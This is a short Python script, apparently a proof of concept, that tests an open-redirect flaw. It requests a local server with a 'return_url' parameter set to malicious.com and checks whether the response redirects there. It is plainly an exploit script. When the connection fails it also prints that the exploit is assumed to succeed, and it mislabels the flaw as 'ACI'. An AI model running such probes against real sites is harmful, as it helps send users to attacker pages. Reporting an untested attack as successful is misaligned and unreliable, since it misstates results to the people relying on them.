import requests

# Define the URL that includes the vulnerable parameter
base_url = "http://localhost:8080/"
vulnerable_param = "return_url"
exploit_url = base_url + "?" + vulnerable_param + "=http://malicious.com"

try:
    response = requests.get(exploit_url)
    # Check if the redirection was to the malicious site
    if response.history:
        redirected_url = response.history[0].headers['Location']
        if "malicious.com" in redirected_url:
            print("The ACI exploit success!!!")
        else:
            print("The ACI exploit failed!!!")
    else:
        print("The ACI exploit failed!!!")
except requests.exceptions.ConnectionError:
    print("Connection refused - Assuming exploit would be successful in a live environment.")
